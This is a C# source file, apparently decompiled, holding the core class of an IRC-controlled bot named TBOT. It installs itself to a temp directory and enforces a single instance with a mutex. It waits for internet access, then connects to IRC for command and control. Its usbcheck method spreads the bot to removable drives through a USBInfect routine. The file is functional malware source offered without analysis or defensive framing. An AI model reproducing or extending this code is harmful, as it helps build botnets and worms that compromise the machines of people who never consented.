using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace TBOT;

internal class Core
{
	public static bool check
	{
		get
		{
			if (!Install.isInstalled)
			{
				return true;
			}
			return false;
		}
		set
		{
		}
	}

	public Core()
	{
		Config.installPath = Config.installPath.Replace("%mainDrive%", Path.GetTempPath()[0].ToString());
		fixBrokenInstall();
		checkMutex();
		checknow();
		while (!checkConnection())
		{
			Thread.Sleep(300000);
		}
		Irc.Initialize();
	}

	private static void checknow()
	{
		if (check)
		{
			Config.ircNick = Config.newNick;
			Install.install();
		}
	}

	private bool checkConnection()
	{
		try
		{
			Dns.GetHostEntry("www.google.com");
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void fixBrokenInstall()
	{
		if (!(Process.GetCurrentProcess().MainModule!.FileName!.ToLower() != (Config.installPath + Config.installFile).ToLower()))
		{
			return;
		}
		try
		{
			if (File.Exists(Config.installPath + Config.installFile))
			{
				File.Delete(Config.installPath + Config.installFile);
			}
		}
		catch (Exception)
		{
			Directory.CreateDirectory(Path.GetTempPath() + Config.startupName + "info\\");
			Config.installPath = Path.GetTempPath() + Config.startupName + "info\\";
			if (File.Exists(Config.installPath + Config.installFile))
			{
				try
				{
					File.Delete(Config.installPath + Config.installFile);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private void checkMutex()
	{
		InstanceUnique instanceUnique = new InstanceUnique("{newfuckingmutex6969104873189327489374389274938274389723894798327489327498327438927328972489237894732849327489327489378439067342897632897439869696969696969696969696969645656196969696969}");
		if (instanceUnique.IsRunning())
		{
			Environment.Exit(0);
		}
	}

	public static void usbcheck()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType == DriveType.Removable && driveInfo.RootDirectory.Root.ToString()[0] == Environment.CurrentDirectory[0])
			{
				USBInfect.installOnDrive(driveInfo);
			}
		}
		Config.ircNick = Config.usbNick;
	}
}
